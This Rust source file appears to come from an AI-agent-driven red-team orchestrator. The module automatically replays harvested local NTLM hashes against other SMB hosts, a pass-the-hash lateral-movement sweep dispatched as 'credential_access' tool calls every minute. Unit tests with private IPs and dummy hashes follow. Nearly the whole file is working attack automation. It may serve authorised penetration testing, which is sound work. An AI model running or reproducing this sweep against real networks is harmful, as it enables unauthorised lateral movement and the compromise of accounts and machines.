use std::sync::Arc;
use std::time::Duration;

use ares_llm::ToolCall;
use serde_json::json;
use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

const MAX_LOCAL_HASHES: usize = 6;
const MAX_DISPATCH_PER_TICK: usize = 5;
const EMPTY_NT_HASH: &str = "31d6cfe0d16ae931b73c59d7e0c089c0";

pub(crate) struct LocalAuthWork {
    pub dedup_key: String,
    pub target_ip: String,
    pub username: String,
    pub nt_hash: String,
}

fn is_hash32(s: &str) -> bool {
    s.len() == 32 && s.bytes().all(|b| b.is_ascii_hexdigit())
}

fn nt_half(hash_value: &str) -> Option<&str> {
    let trimmed = hash_value.trim();
    let candidate = trimmed.rsplit(':').next().unwrap_or(trimmed);
    if is_hash32(candidate) && !candidate.eq_ignore_ascii_case(EMPTY_NT_HASH) {
        Some(candidate)
    } else {
        None
    }
}

fn is_local_reuse_candidate(hash: &ares_core::models::Hash) -> bool {
    if !hash.domain.trim().is_empty() {
        return false;
    }
    if !hash.hash_type.to_lowercase().contains("ntlm") {
        return false;
    }
    let username = hash.username.trim();
    if username.is_empty() || username.ends_with('$') {
        return false;
    }
    !matches!(
        username.to_lowercase().as_str(),
        "guest" | "defaultaccount" | "wdagutilityaccount" | "krbtgt"
    )
}

fn host_has_smb(host: &ares_core::models::Host) -> bool {
    host.services.iter().any(|s| {
        let sl = s.to_lowercase();
        sl.contains("445") || sl.contains("smb") || sl.contains("cifs")
    })
}

fn local_auth_dedup_key(ip: &str, username: &str, nt_hash: &str) -> String {
    format!(
        "local_auth:{}:{}:{}",
        ip,
        username.to_lowercase(),
        &nt_hash[..8]
    )
}

pub(crate) fn collect_local_auth_work(state: &StateInner) -> Vec<LocalAuthWork> {
    let mut candidates: Vec<(String, String, Option<String>)> = Vec::new();
    let mut seen_pairs: std::collections::HashSet<String> = std::collections::HashSet::new();
    for hash in state.hashes.iter().filter(|h| is_local_reuse_candidate(h)) {
        let Some(nt) = nt_half(&hash.hash_value) else {
            continue;
        };
        let key = format!("{}:{}", hash.username.to_lowercase(), nt.to_lowercase());
        if !seen_pairs.insert(key) {
            continue;
        }
        candidates.push((
            hash.username.trim().to_string(),
            nt.to_lowercase(),
            hash.source_host.clone(),
        ));
        if candidates.len() >= MAX_LOCAL_HASHES {
            break;
        }
    }
    if candidates.is_empty() {
        return Vec::new();
    }

    let mut items = Vec::new();
    for host in state.hosts.iter().filter(|h| !h.owned && host_has_smb(h)) {
        if host.ip.trim().is_empty() {
            continue;
        }
        for (username, nt_hash, source_host) in &candidates {
            if source_host
                .as_deref()
                .is_some_and(|src| src.eq_ignore_ascii_case(&host.ip))
            {
                continue;
            }
            let dedup_key = local_auth_dedup_key(&host.ip, username, nt_hash);
            if state.is_processed(DEDUP_LOCAL_AUTH_SWEEP, &dedup_key) {
                continue;
            }
            items.push(LocalAuthWork {
                dedup_key,
                target_ip: host.ip.clone(),
                username: username.clone(),
                nt_hash: nt_hash.clone(),
            });
        }
    }
    items
}

pub(crate) fn build_local_auth_args(item: &LocalAuthWork) -> serde_json::Value {
    json!({
        "target": item.target_ip,
        "username": item.username,
        "hash": item.nt_hash,
    })
}

pub async fn auto_local_auth_sweep(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(60));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("local_auth_sweep") {
            continue;
        }

        let work = {
            let state = dispatcher.state.read().await;
            collect_local_auth_work(&state)
        };

        for item in work.into_iter().take(MAX_DISPATCH_PER_TICK) {
            let task_id = format!("local_auth_{}", uuid::Uuid::new_v4().simple());
            let call = ToolCall {
                id: format!("{}_call", task_id),
                name: "smb_local_auth_check".to_string(),
                arguments: build_local_auth_args(&item),
            };

            match dispatcher
                .llm_runner
                .tool_dispatcher()
                .dispatch_tool("credential_access", &task_id, &call)
                .await
            {
                Ok(result) => {
                    let reused = result
                        .discoveries
                        .as_ref()
                        .and_then(|d| d.get("hashes"))
                        .and_then(|v| v.as_array())
                        .is_some_and(|a| !a.is_empty());
                    info!(
                        task_id = %task_id,
                        host = %item.target_ip,
                        user = %item.username,
                        reused,
                        "Local-auth reuse sweep completed"
                    );
                }
                Err(e) => {
                    warn!(err = %e, host = %item.target_ip, "Failed to dispatch local-auth sweep");
                }
            }

            {
                let mut state = dispatcher.state.write().await;
                state.mark_processed(DEDUP_LOCAL_AUTH_SWEEP, item.dedup_key.clone());
            }
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_LOCAL_AUTH_SWEEP, &item.dedup_key)
                .await;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use ares_core::models::{Hash, Host};

    fn local_hash(username: &str, hash_value: &str, source_host: Option<&str>) -> Hash {
        Hash {
            id: format!("h-{username}"),
            username: username.into(),
            hash_value: hash_value.into(),
            hash_type: "NTLM".into(),
            domain: String::new(),
            cracked_password: None, // pragma: allowlist secret
            source: "secretsdump".into(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: source_host.map(|s| s.to_string()),
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    fn smb_host(ip: &str, owned: bool) -> Host {
        Host {
            ip: ip.into(),
            hostname: format!("ws01-{ip}"),
            os: String::new(),
            roles: Vec::new(),
            services: vec!["445/tcp microsoft-ds".into()],
            is_dc: false,
            owned,
        }
    }

    #[test]
    fn nt_half_takes_nt_from_lm_nt_pair() {
        assert_eq!(
            nt_half("aad3b435b51404eeaad3b435b51404ee:abcdef1234567890abcdef1234567890"),
            Some("abcdef1234567890abcdef1234567890")
        );
        assert_eq!(
            nt_half("abcdef1234567890abcdef1234567890"),
            Some("abcdef1234567890abcdef1234567890")
        );
    }

    #[test]
    fn nt_half_rejects_empty_password_hash() {
        assert!(
            nt_half("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0").is_none()
        );
        assert!(nt_half("not-a-hash").is_none());
    }

    #[test]
    fn domain_bound_hashes_are_not_local_candidates() {
        let mut h = local_hash("alice", "abcdef1234567890abcdef1234567890", None);
        h.domain = "contoso.local".into();
        assert!(!is_local_reuse_candidate(&h));
    }

    #[test]
    fn machine_and_builtin_accounts_skipped() {
        assert!(!is_local_reuse_candidate(&local_hash(
            "WS01$",
            "abcdef1234567890abcdef1234567890",
            None
        )));
        assert!(!is_local_reuse_candidate(&local_hash(
            "Guest",
            "abcdef1234567890abcdef1234567890",
            None
        )));
    }

    #[test]
    fn sweep_replays_local_hash_against_other_hosts() {
        let mut state = StateInner::new("op".into());
        state.hashes.push(local_hash(
            "admin",
            "aad3b435b51404eeaad3b435b51404ee:abcdef1234567890abcdef1234567890",
            Some("192.168.58.20"),
        ));
        state.hosts.push(smb_host("192.168.58.20", false));
        state.hosts.push(smb_host("192.168.58.21", false));
        state.hosts.push(smb_host("192.168.58.22", true));

        let work = collect_local_auth_work(&state);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].target_ip, "192.168.58.21");
        assert_eq!(work[0].username, "admin");
        assert_eq!(work[0].nt_hash, "abcdef1234567890abcdef1234567890");
        assert_eq!(work[0].dedup_key, "local_auth:192.168.58.21:admin:abcdef12");
    }

    #[test]
    fn sweep_args_carry_no_domain() {
        let item = LocalAuthWork {
            dedup_key: "k".into(),
            target_ip: "192.168.58.21".into(),
            username: "admin".into(),
            nt_hash: "abcdef1234567890abcdef1234567890".into(),
        };
        let args = build_local_auth_args(&item);
        assert_eq!(args["target"], "192.168.58.21");
        assert_eq!(args["username"], "admin");
        assert_eq!(args["hash"], "abcdef1234567890abcdef1234567890");
        assert!(args.get("domain").is_none());
    }

    #[test]
    fn sweep_respects_dedup() {
        let mut state = StateInner::new("op".into());
        state.hashes.push(local_hash(
            "admin",
            "abcdef1234567890abcdef1234567890",
            None,
        ));
        state.hosts.push(smb_host("192.168.58.21", false));
        state.mark_processed(
            DEDUP_LOCAL_AUTH_SWEEP,
            "local_auth:192.168.58.21:admin:abcdef12".to_string(),
        );
        assert!(collect_local_auth_work(&state).is_empty());
    }

    #[test]
    fn sweep_skips_hosts_without_smb() {
        let mut state = StateInner::new("op".into());
        state.hashes.push(local_hash(
            "admin",
            "abcdef1234567890abcdef1234567890",
            None,
        ));
        state.hosts.push(Host {
            ip: "192.168.58.21".into(),
            hostname: "web01".into(),
            os: String::new(),
            roles: Vec::new(),
            services: vec!["80/tcp http".into()],
            is_dc: false,
            owned: false,
        });
        assert!(collect_local_auth_work(&state).is_empty());
    }

    #[test]
    fn sweep_caps_distinct_local_hashes() {
        let mut state = StateInner::new("op".into());
        for i in 0..(MAX_LOCAL_HASHES + 4) {
            state.hashes.push(local_hash(
                &format!("svc_{i}"),
                &format!("{:032x}", i + 1),
                None,
            ));
        }
        state.hosts.push(smb_host("192.168.58.21", false));
        assert_eq!(collect_local_auth_work(&state).len(), MAX_LOCAL_HASHES);
    }
}
